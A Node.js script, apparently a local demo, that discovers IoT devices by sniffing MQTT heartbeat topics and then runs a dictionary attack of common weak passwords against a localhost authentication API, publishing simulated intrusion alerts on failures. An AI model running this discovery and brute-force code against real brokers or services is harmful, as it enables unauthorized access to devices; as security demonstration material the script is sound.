import axios from 'axios';
import mqtt from 'mqtt';
import 'dotenv/config';

const SERVER_URL = `http://localhost:${process.env.SERVER_PORT || 3000}`;
const BROKER_URL = process.env.MQTT_BROKER_URL || 'mqtt://localhost:1883';

// 1. Weak passwords a hacker would guess
const DICTIONARY = [
    'admin', '123456', 'password', 'welcome', 
    'mqtt-user', 'root', 'guest', 'iot-device'
];

console.log('\x1b[31m😈 [BRUTE FORCE] Initializing...\x1b[0m');
console.log('\x1b[31m📡 [BRUTE FORCE] Sniffing network for active devices...\x1b[0m');

// 2. Automate Target Discovery via MQTT Sniffing
const client = mqtt.connect(BROKER_URL, { clientId: 'attacker_scanner' });
let targetId = null;

client.on('connect', () => {
    client.subscribe('device/+/heartbeat');
});

client.on('message', (topic, message) => {
    // topic format: device/publisher-1234/heartbeat
    const parts = topic.split('/');
    if (parts.length === 3 && parts[2] === 'heartbeat') {
        targetId = parts[1];
        console.log(`\x1b[32m🎯 [TARGET ACQUIRED] Found active device: ${targetId}\x1b[0m`);
        
        // [CHANGED] Do NOT close the client here. We need it to publish alerts later.
        client.unsubscribe('device/+/heartbeat'); 
        
        launchAttack(targetId); // Start the attack
    }
});

// Timeout if no device found
setTimeout(() => {
    if (!targetId) {
        console.log('\x1b[33m❌ [BRUTE FORCE] No devices found. Is the Publisher running?\x1b[0m');
        process.exit(0);
    }
}, 10000);

// 3. The Attack Logic
async function launchAttack(deviceId) {
    console.log(`\x1b[31m⚡ [BRUTE FORCE] Launching dictionary attack on ${deviceId}...\x1b[0m`);

    try {
        // Step A: Get a valid session (The "Knock")
        const init = await axios.post(`${SERVER_URL}/api/auth/initiate`, { deviceId });
        const sessionId = init.data.sessionId;

        // Step B: Rapid-fire guess passwords
        for (const guess of DICTIONARY) {
            process.stdout.write(`    Trying secret: "${guess.padEnd(12)}" `);
            
            try {
                const res = await axios.post(`${SERVER_URL}/api/auth/validate-credentials`, {
                    sessionId,
                    secret: guess
                });

                if (res.data.success) {
                    console.log(' -> \x1b[32m✅ CRACKED! System Vulnerable.\x1b[0m');
                    client.end();
                    process.exit(0);
                }
            } catch (e) {
                // [NEW] Simulate Server/IDS detecting the failed attempt
                // This publishes to the topic your Subscriber is listening to!
                client.publish('system/alerts', `Brute Force Attempt Blocked: ${guess}`);
                
                console.log(' -> \x1b[31m❌ REJECTED\x1b[0m');
            }
        }
        
        console.log('\n\x1b[34m🛡️ [RESULT] Attack Failed. Strong password prevented access.\x1b[0m');
        client.end();
        process.exit(0);

    } catch (e) {
        console.log(`\n\x1b[33m⚠️ Attack Error: ${e.message}\x1b[0m`);
        client.end();
        process.exit(1);
    }
}